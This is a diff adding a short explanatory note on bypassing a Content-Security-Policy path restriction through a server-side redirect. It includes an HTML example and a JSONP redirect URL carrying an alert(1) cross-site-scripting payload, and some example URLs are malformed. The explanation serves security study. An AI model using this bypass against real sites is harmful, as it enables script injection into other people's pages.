@@ -1,0 +1,30 @@
+when CSP encounters a server side redirection that leads to a different origin that is not allowed, the CSP won't get bypassed.
+
+however accroding to the description in CSP spec 4.2.2.3. paths and redirections, if the redirection leads to a different path, it can bypass the original restrictions.
+
+For example:
+
+CSP is: script-src http://localhost:5555 https://www.google.com/a/b/c/d
+
+
+```
+<!DOCTYPE html>
+<html>
+<head>
+  <meta http-equiv="Content-Security-Policy" content="script-src http://localhost:5555 https://www.google.com/a/b/c/d">
+</head>
+<body>
+  <div id=userContent>
+    <script src="https://https://www.google.com/test"></script>
+    <script src="https://https://www.google.com/a/test"></script>
+    <script src="http://localhost:5555/301"></script>
+  </div>
+</body>
+</html>
+```
+
+If CSP is sert to `https://www.google.com/a/b/c/d`, since the path is considered both `/test` and `/a/test` scripts will be blocked by CSP.
+
+However, the final http://localhost:5555/301 will be redirected on the server-side to https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//. Since it is a redirection, the path is not considered, and the script can be loaded, thus bypassing the path restriction.
+
+With this redirection, even if the path is specified completely, it will still be bypassed.
